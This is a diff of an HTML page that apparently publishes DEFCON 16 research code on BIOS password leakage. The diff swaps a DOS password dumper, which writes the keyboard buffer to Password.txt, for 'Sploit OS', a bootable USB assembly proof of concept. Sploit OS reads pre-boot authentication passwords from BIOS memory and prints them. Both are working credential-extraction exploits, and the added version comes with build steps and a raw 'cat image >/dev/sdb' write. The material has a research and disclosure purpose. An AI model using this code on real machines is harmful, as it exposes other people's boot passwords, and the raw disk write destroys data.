@@ -2,9 +2,9 @@
 <html lang="en">
 <html>
 <head>
+<title>Defcon BIOS spoitos.S</title>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-<title>Bios Password Physical Memory Reader exploits (DEFCON 16)</title>
-<link rel="canonical" href="https://moabi.com/research/jbrossard/whitepapers/tools/BIOS/wbios.asm" />
+<link rel="canonical" href="https://moabi.com/research/jbrossard/whitepapers/tools/tools_defcon_16_BIOS/sploit-os/sploitos.S.html" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0, minimum-scale=0.86">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
     <!-- Content Security Policy -->
@@ -382,79 +382,206 @@ span { display: inline-block; }
 
 <body class="f9 b9">
 <pre>
-<span class="f7">;---------------- [ wbiosw.asm ]-----------------------------------------</span>
+;----------------------------------------------------------------------------------------------
+;
+; Simple bootstrap to test our BIOS shellcode and verify that passwords can be leaked <span class="f4">in</span>
+; plain text under REAL MODE.
+;
+; // Jonathan Brossard
+; jb@endrazine.com
+; endrazine@gmail.com
+;
+;----------------------------------------------------------------------------------------------
+;		[ Compiling and using Sploit OS ]
+;
+; The purpose of this code is to create a bootable usb disk image Poc
+; that will retrieve pre-boot authentication passwords from BIOS memory
+; <span class="f4">in</span> Real mode when booted.
+;
+;
+; Here, I assume your usb disk is located on /dev/sdb
+; Use <span class="f3">`fdisk -l`</span> to get your usb device name and modify
+; those commands to match your own device name.
+;
+;
+; Compiling :
+;
+;       root@blackbox:/home/jonathan/blackhat/sploit-os<span class="f7"># nasm -fbin sploitos.asm -o sploitos.img
+</span>;
+; Verifying the bootable image is ok:
+;
+;        root@blackbox:/home/jonathan/blackhat/sploit-os<span class="f7"># file sploitos.img sploitos.img:</span>
+;        x86 boot sector, code offset <span class="f4">0x3c</span>, OEM-ID <span class="f3">&quot;SploitOS&quot;</span>, sectors/cluster <span class="f4">4</span>, root entries <span class="f4">512</span>,
+;        sectors <span class="f4">32768</span> (volumes &lt;=<span class="f4">32</span> MB) , Media descriptor <span class="f4">0xf8</span>, sectors/FAT <span class="f4">32</span>, heads <span class="f4">64</span>,
+;        serial number <span class="f4">0xdeb00001</span>, label: <span class="f3">&quot;[endrazine]&quot;</span>, FAT (<span class="f4">16</span> bit)
+;        root@blackbox:/home/jonathan/blackhat/sploit-os<span class="f7">#</span>
+;
+; Installing:
+; 
+;        root@blackbox:/home/jonathan/blackhat/sploit-os<span class="f7"># cat sploitos.img &gt;/dev/sdb</span>
+;        root@blackbox:/home/jonathan/blackhat/sploit-os<span class="f7">#</span>
+;
+; Rebooting:
+;
+;        root@blackbox:/home/jonathan/blackhat/sploit-os<span class="f7"># reboot</span>
+;
+;----------------------------------------------------------------------------------------------
+
+org <span class="f4">0x7c00</span>					;to be loaded at RAM address <span class="f4">0000</span>:<span class="f4">7</span>C00
 
 
-<span class="f7">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span>
-<span class="f7">;  Endrazine - Jonathan Brossard - jb@endrazine.com  ;</span>
-<span class="f7">;        Bios Password Physical Memory Reader        ;</span>
-<span class="f7">;      Write to file Windows Compatible version      ;</span>
-<span class="f7">;                                                    ;</span>
-<span class="f7">;Compiling : A86 wbiosw.asm wbiosw.com               ;</span>
-<span class="f7">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span>
-
-<span class="f2">code</span> <span class="f5">seg</span><span class="f1">ment</span>
-        <span class="f4">org</span> <span class="f4">100h</span>
-        <span class="f4">assume</span> <span class="f6">ds</span>:<span class="f1">code</span>, <span class="f6">es</span>:<span class="f1">code</span>, <span class="f6">cs</span>:<span class="f1">code</span>
-
-start:
-        <span class="f2">mov</span> <span class="f6">ah</span>, <span class="f4">09h</span>
-        <span class="f2">mov</span> <span class="f6">dx</span>,<span class="f1">offset</span> <span class="f1">welcome</span>
-        <span class="f2">int</span> <span class="f4">21h</span>
-
-        <span class="f2">xor</span> <span class="f6">ax</span>,<span class="f6">ax</span>
-        <span class="f2">int</span> <span class="f4">16h</span>
-
-        <span class="f2">mov</span> <span class="f6">ds</span>, <span class="f4">40h</span>                  <span class="f7">; This is the input buffer adress</span>
-        <span class="f2">mov</span> <span class="f6">si</span>, <span class="f4">01EH</span>                 <span class="f7">; starting at 40h:01eh</span>
-        <span class="f2">mov</span> <span class="f6">di</span>,<span class="f1">offset</span> <span class="f1">buffer</span>
-        <span class="f2">mov</span> <span class="f6">cx</span>,<span class="f4">32</span>
-
-daloop:
-        <span class="f2">mov</span> <span class="f6">ax</span>,[<span class="f6">ds</span>:<span class="f6">si</span>]
-        <span class="f2">mov</span> [<span class="f6">cs</span>:<span class="f6">di</span>],<span class="f6">ax</span>
-        <span class="f2">inc</span> <span class="f6">di</span>
-        <span class="f2">add</span> <span class="f6">si</span>,<span class="f4">2</span>                    <span class="f7">; Replace this line by add si,4</span>
-                                    <span class="f7">; if you plan to use it under Dos</span>
-<span class="f2">loop</span> <span class="f1">daloop</span>
-
-        <span class="f2">mov</span> <span class="f6">ds</span>,<span class="f6">es</span>
-
-        <span class="f2">mov</span> <span class="f6">ah</span>, <span class="f4">3ch</span>                 <span class="f7">; MS DOS Create file Function</span>
-        <span class="f2">mov</span> <span class="f6">dx</span>, <span class="f1">offset</span> <span class="f1">fname</span>
-        <span class="f2">xor</span> <span class="f6">cx</span>,<span class="f6">cx</span>
-        <span class="f2">int</span> <span class="f4">21h</span>
+section <span class="f4">.</span>text 
 
 
-        <span class="f2">mov</span> <span class="f6">ax</span>, <span class="f4">3d01h</span>               <span class="f7">; MS DOS Open file Function</span>
-        <span class="f2">int</span> <span class="f4">21h</span>
-        <span class="f2">mov</span> <span class="f1">handle</span>,<span class="f6">ax</span>
-
-        <span class="f2">mov</span> <span class="f6">ah</span>, <span class="f4">40h</span>
-        <span class="f2">mov</span> <span class="f6">bx</span>,<span class="f1">handle</span>
-        <span class="f2">mov</span> <span class="f6">cx</span>,<span class="f4">32</span>
-        <span class="f2">mov</span> <span class="f6">dx</span>, <span class="f1">offset</span> <span class="f1">Msg</span>
-        <span class="f2">int</span> <span class="f4">21h</span>                     <span class="f7">; Write buffer to file</span>
+_start:
+	jmp short realstart		; jump over the boot record<span class="f3">'s data</span>
 
 
-        <span class="f2">mov</span> <span class="f6">ax</span>,<span class="f4">4ch</span>                  <span class="f7">; Quit</span>
-        <span class="f2">int</span> <span class="f4">21h</span>
+<span class="f3">; ----------------------------------------------------------------------</span>
+<span class="f3">; Create a boot record with appropriate geometry etc. for a usb boot disk</span>
+<span class="f3">; ----------------------------------------------------------------------</span>
+<span class="f3">brINT13Flag     DB      90H             ; 0002h - 0EH for INT13 AH=42 READ</span>
+<span class="f3">brOEM           DB      '</span>SploitOS<span class="f3">'      ; 0003h - OEM name &amp; DOS version (8 chars)</span>
+<span class="f3">brBPS           DW      512             ; 000Bh - Bytes/sector</span>
+<span class="f3">brSPC           DB      4               ; 000Dh - Sectors/cluster</span>
+<span class="f3">brResCount      DW      1               ; 000Eh - Reserved (boot) sectors</span>
+<span class="f3">brFATs          DB      2               ; 0010h - FAT copies</span>
+<span class="f3">brRootEntries   DW      200H		; 0011h - Root directory entries</span>
+<span class="f3">brSectorCount   DW      32768		; 0013h - Sectors in volume, &lt; 32MB</span>
+<span class="f3">brMedia         DB      0xf8		; 0015h - Media descriptor</span>
+<span class="f3">brSPF           DW      32              ; 0016h - Sectors per FAT</span>
+<span class="f3">brSPH           DW      32              ; 0018h - Sectors per track</span>
+<span class="f3">brHPC           DW      64		; 001Ah - Number of Heads</span>
+<span class="f3">brHidden        DD      0               ; 001Ch - Hidden sectors</span>
+<span class="f3">brSectors       DD      0	        ; 0020h - Total number of sectors</span>
+<span class="f3">		DB      0               ; 0024h - Physical drive no.</span>
+<span class="f3">		DB      0               ; 0025h - Reserved (FAT32)</span>
+<span class="f3">		DB      29H             ; 0026h - Extended boot record sig </span>
+<span class="f3">brSerialNum     DD      0xdeb00001      ; 0027h - Volume serial number (random)</span>
+<span class="f3">brLabel         DB      '</span>[endrazine]<span class="f3">'   ; 002Bh - Volume label  (11 chars)</span>
+<span class="f3">brFSID          DB      '</span>FAT16   <span class="f3">'      ; 0036h - File System ID (8 chars)</span>
+<span class="f3">;------------------------------------------------------------------------</span>
+
+<span class="f3">realstart:</span>
+<span class="f3">	mov ax, 0x1301				; BIOS write string function</span>
+<span class="f3">	mov bx, 0x07				; write in current page</span>
+
+<span class="f3">	mov cx, 122</span>
+<span class="f3">	xor dx, dx				; start in upper left corner</span>
+<span class="f3">	mov ebp, Creditstring</span>
+<span class="f3">	int 0x10</span>
+
+
+<span class="f3">	mov bx, 4</span>
+<span class="f3">	mov dx, 5</span>
+<span class="f3">	xor dx,dx</span>
+<span class="f3">	mov dh, 7</span>
+
+
+<span class="f3">	smsw ax				; Verify we are in real (or v86 ?) mode...</span>
+<span class="f3">	test al,1			; by checking PE bit of CR0</span>
+<span class="f3">	je near real</span>
+<span class="f3">					; we are in v86 mode...</span>
+<span class="f3">	mov ax, 0x1301</span>
+<span class="f3">	mov cx, 56</span>
+<span class="f3">	mov ebp, v86string</span>
+<span class="f3">	int 0x10</span>
+
+<span class="f3">	jmp near reboot</span>
+
+<span class="f3">real:					; we are in real mode...</span>
+<span class="f3">	mov ax, 0x1301</span>
+<span class="f3">	mov cx, 76</span>
+<span class="f3">	mov ebp, realstring</span>
+<span class="f3">	int 0x10</span>
+
+<span class="f3">;---------------------------------[ Start of BIOS shellcode ]---------------------------------</span>
+
+<span class="f3">        xor ah, ah</span>
+<span class="f3">        mov al, 0x40                             ; 0x40:0x1e : keyboard buffer address</span>
+<span class="f3">        mov ds, ax</span>
+
+<span class="f3">        mov al, 0x1e</span>
+<span class="f3">        mov si, ax</span>
+
+<span class="f3">        mov cx, 0x10</span>
+
+<span class="f3">leakloop:</span>
+<span class="f3">        mov ax, [ds:si]</span>
+<span class="f3">        xor ah, ah</span>
+
+<span class="f3">        cmp al, 0x20</span>
+<span class="f3">        jb keepcopying</span>
+<span class="f3">        cmp al, 0x7e</span>
+<span class="f3">        jb keepcopying2</span>
+
+<span class="f3">keepcopying:</span>
+<span class="f3">        mov al, 0x20</span>
+<span class="f3">keepcopying2:</span>
+<span class="f3">        add si, byte +0x2                       ; Replace this line by add si,4</span>
+<span class="f3">                                                ; if you plan to use it under MS-Dos</span>
+<span class="f3">                                                ; due to imperfect emulation of 16b</span>
+<span class="f3">                                                ; arch under vm86.</span>
+<span class="f3">        push si</span>
+<span class="f3">        push cx</span>
+<span class="f3">        push ax</span>
+<span class="f3">        mov ah, 0x03</span>
+<span class="f3">        xor bh, bh</span>
+<span class="f3">        int 0x10</span>
+
+<span class="f3">        mov ah, 0x02</span>
+<span class="f3">        inc dl</span>
+<span class="f3">        int 0x10</span>
+
+<span class="f3">        pop ax</span>
+
+<span class="f3">        mov ah, 0ah</span>
+<span class="f3">        mov bl, 06h</span>
+<span class="f3">        mov cl, 0x01</span>
+<span class="f3">        int 0x10</span>
+<span class="f3">        pop cx</span>
+<span class="f3">        pop si</span>
+
+<span class="f3">        loop leakloop</span>
+
+<span class="f3">;---------------------------------[ End of BIOS shellcode ]---------------------------------</span>
+<span class="f3">reboot:</span>
+<span class="f3">	mov ax, 0x1301</span>
+<span class="f3">	mov bx, 4</span>
+<span class="f3">	mov cx, 27</span>
+<span class="f3">	xor dx, dx</span>
+<span class="f3">	mov dh, 11</span>
+<span class="f3">	mov ebp, Byestring</span>
+<span class="f3">	int 0x10</span>
+
+<span class="f3">	xor ax, ax				; wait for a key to be pressed</span>
+<span class="f3">	int 0x16</span>
+
+
+<span class="f3">	jmp 0xffff:0x0</span>
+<span class="f3">;	db 0x0EA				;              </span>
+<span class="f3">;	dw 0x0000				; Reboot</span>
+<span class="f3">;	dw 0x0FFFF				;</span>
 
 
 
+<span class="f3">v86string	db '</span>--[ According to cr0, you are <span class="f4">in</span> v86 mode :( Quitting...<span class="f3">',13,10</span>
+<span class="f3">realstring	db '</span>--[ According to cr0, you are <span class="f4">in</span> real <span class="f4">mode</span>, ok<span class="f3">',10,13</span>
+<span class="f3">		db '',13,10</span>
+<span class="f3">		db '</span>--[ Password (<span class="f4">if</span> <span class="f4">any</span>) is : <span class="f3">',10,13</span>
+<span class="f3">		db '',13,10</span>
 
-<span class="f1">handle</span><span class="f4"> dw</span> <span class="f1">?</span>
-<span class="f1">welcome</span><span class="f4"> db</span> <span class="f3">'Password dumper by Endrazine (jb@endrazine.com)'</span>,<span class="f4">10</span>,<span class="f4">13</span>
-        <span class="f4">db</span> <span class="f3">''</span>,<span class="f4">10</span>,<span class="f4">13</span>
-        <span class="f4">db</span> <span class="f3">'Dumping Password to Password.txt'</span>,<span class="f4">10</span>,<span class="f4">13</span>
-        <span class="f4">db</span> <span class="f3">'Press any Key$'</span>,<span class="f4">10</span>,<span class="f4">13</span>
-<span class="f1">fname</span><span class="f4"> db</span> <span class="f3">'Password.txt'</span>,<span class="f4">0</span>
-<span class="f1">Msg</span><span class="f4"> db</span> <span class="f3">'Password is : '</span>,<span class="f4">0</span>
-<span class="f1">buffer</span><span class="f4"> db</span> <span class="f4">32</span> <span class="f1">dup</span> <span class="f1">?</span>
-<span class="f4">end</span> <span class="f1">start</span>
+<span class="f3">Creditstring	db '</span> [ Sploit OS : Real mode BIOS hysteresis Poc ]<span class="f3">',13,10</span>
+<span class="f3">		db '',10,13</span>
+<span class="f3">		db '</span> // Jonathan Brossard - jonathan@ivizindia.com - endrazine@gmail.com<span class="f3">',13,10</span>
+<span class="f3">		db '',13,10</span>
 
-<span class="f4">end</span>
+<span class="f3">Byestring	db '</span>--[ Press any key to reboot<span class="f3">'</span><span class="underline"><span class="f1"><span class="bold">,10,13</span></span></span>
+
+times <span class="f4">512</span>-($-$$)<span class="f4">-2</span> db <span class="f4">0</span>				; Write boot signature at 
+        dw <span class="f4">0x0AA55</span>				; address (<span class="f4">512</span> - <span class="f4">2</span>) bytes
+
+;EOF
 </pre>
 </body>
 </html>
-
